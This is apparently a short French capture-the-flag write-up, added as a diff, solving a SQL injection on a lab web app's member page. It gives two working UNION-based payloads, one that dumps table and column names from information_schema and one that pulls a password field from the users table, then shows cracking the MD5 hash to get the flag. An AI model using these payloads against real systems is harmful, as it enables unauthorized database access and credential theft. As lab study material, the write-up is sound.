@@ -1,0 +1,10 @@
+Dans la page http://192.168.64.17/?page=member
+avec cette commande on trouve toutes les tables et leurs schémas
+1 OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns
+
+avec cette commande on retrouve la table qu'il nous faut avec les users
+1 AND 1=2 UNION SELECT countersign, commentaire FROM users
+
+En trouvant les colonnes il suffit de rentrer cette requete sql d'ans l'input.
+Puis avec md5 decrypt on obtient FortyTwo
+En sha256 "https://10015.io/tools/sha256-encrypt-decrypt" on obtient le flag
